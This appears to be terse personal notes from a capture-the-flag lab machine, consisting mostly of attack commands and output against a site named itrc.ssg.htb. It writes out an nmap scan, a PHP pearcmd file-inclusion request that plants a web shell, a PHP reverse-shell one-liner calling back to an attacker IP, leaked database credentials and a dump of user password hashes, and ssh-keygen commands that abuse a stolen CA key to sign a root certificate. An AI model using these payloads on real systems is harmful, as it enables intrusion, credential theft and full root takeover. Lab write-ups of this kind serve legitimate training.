10.13.37.12o o
```bash
┌─[aexon@parrot]─[~]
└──╼ $nmap -sV -sC 10.10.11.27 -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-04 18:56 WIB
Nmap scan report for 10.10.11.27
Host is up (1.2s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 d5:4f:62:39:7b:d2:22:f0:a8:8a:d9:90:35:60:56:88 (ECDSA)
|_  256 fb:67:b0:60:52:f2:12:7e:6c:13:fb:75:f2:bb:1a:ca (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://itrc.ssg.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
2222/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f2:a6:83:b9:90:6b:6c:54:32:22:ec:af:17:04:bd:16 (ECDSA)
|_  256 0c:c3:9c:10:f5:7f:d3:e4:a8:28:6a:51:ad:1a:e1:bf (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 116.48 seconds
```


/var/www/itrc
exploit

https://giters.com/Mr-xn/thinkphp_lang_RCE


refrensi : https://github.com/atk7r/ThinkPHP-RCE-Poc/blob/main/Thinkphp_Multilingual_Module_Rce.py


request 

```json
GET /index.php?page=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?=@system('ls');?>+/tmp/aexon.php HTTP/1.1
Host: itrc.ssg.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://itrc.ssg.htb/index.php?page=login
Connection: close
Cookie: PHPSESSID=6be88ed7a04a35a40367e15dbe594eee
Upgrade-Insecure-Requests: 1
Priority: u=0, i

```

../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/<?=@system($_GET['cmd']);?>+/var/www/itrc/shell.php

payload :

php -r '$sock=fsockopen("10.10.16.59",4444);popen("sh <&3 >&3 2>&3", "r");'

```php
<?php

$dsn = "mysql:host=db;dbname=resourcecenter;";
$dbusername = "jj";
$dbpassword = "ugEG5rR5SG8uPd";
$pdo = new PDO($dsn, $dbusername, $dbpassword);

try {
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOException $e) {
    die("Connection failed: " . $e->getMessage());

```


```bash
 mysql -h db -u jj -p               
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 78
Server version: 11.3.2-MariaDB-1:11.3.2+maria~ubu2204 mariadb.org binary distribution

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> 

```


```mysql
MariaDB [resourcecenter]> select * from users;
+----+-------------+--------------------------------------------------------------+-------+------------+
| id | user        | password                                                     | role  | department |
+----+-------------+--------------------------------------------------------------+-------+------------+
|  1 | zzinter     | $2y$10$VCpu.vx5K6tK3mZGeir7j.ly..il/YwPQcR2nUs4/jKyUQhGAriL2 | admin | NULL       |
|  2 | msainristil | $2y$10$AT2wCUIXC9jyuO.sNMil2.R950wZlVQ.xayHZiweHcIcs9mcblpb6 | admin | NULL       |
|  3 | mgraham     | $2y$10$4nlQoZW60mVIQ1xauCe5YO0zZ0uaJisHGJMPNdQNjKOhcQ8LsjLZ2 | user  | NULL       |
|  4 | kgrant      | $2y$10$pLPQbIzcehXO5Yxh0bjhlOZtJ18OX4/O4mjYP56U6WnI6FvxvtwIm | user  | NULL       |
|  5 | bmcgregor   | $2y$10$nOBYuDGCgzWXIeF92v5qFOCvlEXdI19JjUZNl/zWHHX.RQGTS03Aq | user  | NULL       |
|  6 | cgxllxtxbr  | $2y$10$dhWgauaX5rWlSMFBC1e2dedv0ePpBDtBOY7eVkcI2npSjsNt0hvB2 | user  | NULL       |
|  7 | ucvjlpbfnn  | $2y$10$VCZJdE/UWFmGMG7/vo725.jgvv1oyrqwYtAkKnlK91wT4zmLoeBpm | user  | NULL       |
|  8 | cozapndgfj  | $2y$10$DdSbELDiuxPH3Uvfqn/dlegaGQ3VtAOICyXGTVeoKNptdL8r90H7y | user  | NULL       |
|  9 | new         | $2y$10$FmPtAd2lhWZF1yA8Q0imgeeOSi5KDmOy0BsdsLE.hLUNzZmvOAlsK | user  | NULL       |
| 10 | aaa         | $2y$10$K35ifEVvD9zAAIpet40jgOVdbHUpWXAZMP6xCV0F6yRCeRU3xNdLy | user  | NULL       |
| 11 | elit3pwner  | $2y$10$K2anZMhD9IKJLKn22Y/tZeFEhNhdob96ptp/1T.tL4XtddHSx2uOy | user  | NULL       |
| 12 | swaim       | $2y$10$ERswQ6FU1cJWqN3yJOu2HO3.afgevGd2FFjg7jsEeXy/6J.GXJYEu | user  | NULL       |
| 13 | roll        | $2y$10$2BafQjyr8uqqDgGg.Y.sXOcPR8PWdbGLuGMT.1wokO1WLT59tWV4m | user  | NULL       |
+----+-------------+--------------------------------------------------------------+-------+------------+

```




```mysql
|  1 | Need SSH Access to HR Server                 | closed | I need to access the HR server to update the employee handbook.                                                                                                                                                                                                  | 2024-02-01 08:09:21 |            3 | ../uploads/e8c6575573384aeeab4d093cc99c7e5927614185.zip | pubkey-mgraham-please-sign.zip |
|  2 | Decommission ITRC SSH Certificate            | closed | We need to decommission the old ITRC SSH certificate infrastructure in favor of the new organization-wide IT signing certs. I'm handling the transition to the new system from the ITSC-side. Mike - Can you handle removing the old certs from the ITRC server? | 2024-02-02 13:12:11 |            1 | NULL                                                    | NULL                           |
|  3 | Malware in finance dept                      | open   | We have detected malware on the finance department server. We need to take it offline and clean it.                                                                                                                                                              | 2024-02-03 14:12:11 |            4 | NULL                                                    | NULL                           |
|  4 | Please provision access to marketing servers | closed | I'm new to the IT team, need access to the marketing servers in order to apply updates and configure firewall. Public key attached.                                                                                                                              | 2024-02-04 13:27:27 |            5 | ../uploads/eb65074fe37671509f24d1652a44944be61e4360.zip | mcgregor_pub.zip               |
|  5 | SSH Key Signing Broken                       | open   | The admin panel is supposed to allow me to get a signed certficate, but it just isn't working.                                                                                                                                                                   | 2024-02-04 14:19:54 |            2 | NULL                                                    | NULL                           |
|  6 | AutoPWN                                      | open   | AutoPWN                                                                                                                                                                                                                                                          | 2024-07-25 11:28:39 |            6 | ../uploads/b829beac87ea0757d7d3432edeac36c6542f46c4.zip | shell.zip                      |
|  7 | AutoPWN                                      | open   | AutoPWN                                                                                                                                                                                                                                                          | 2024-07-25 11:30:31 |            7 | ../uploads/21de93259c8a45dd2223355515f1ee70d8763c8a.zip | shell.zip                      |
|  8 | AutoPWN                                      | open   | AutoPWN                                                                                                                                                                                                                                                          | 2024-07-25 12:48:56 |            8 | ../uploads/88dd73e336c2f81891bddbe2b61f5ccb588387ef.zip | shell.zip                      |
|  9 | crack                                        | open   | crack
                                                                                                                                                                                                                                                          | 2024-08-05 20:55:51 |            9 | ../uploads/403ece33ca82cfb21c741e0d26bacf9a90553c4f.zip | shell.zip                      |
| 10 |                                              | open   |                                                                                                                                                                                                                                                                  | 2024-08-06 00:20:32 |           10 | ../uploads/e98d2b6f4da02db43d7884cd952d4bdf181c1ae9.zip | ticket.zip                     |
| 11 |                                              | open   |                                                                                                                                                                                                                                                                  | 2024-08-06 00:23:31 |           10 | NULL                                                    | NULL                           |
| 12 | a                                            | open   | a                                                                                                                                                                                                                                                                | 2024-08-06 00:56:56 |           11 | ../uploads/e4f356bee06b6513e13a5ea6bfc7ed73c359d40a.zip | info.zip                       |
+----+----------------------------------------------+--------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------+--------------+---------------------------------------------------------+--------------------------------+
```

82yards2closeit

`ssh-keygen -t rsa -b 2048 -f keypair`  
`ssh-keygen -s ca-itrc -I user-cert -n root -V +52w -z 12345 keypair.pub`  
`ssh -o CertificateFile=keypair-cert.pub -i keypair root@localhost`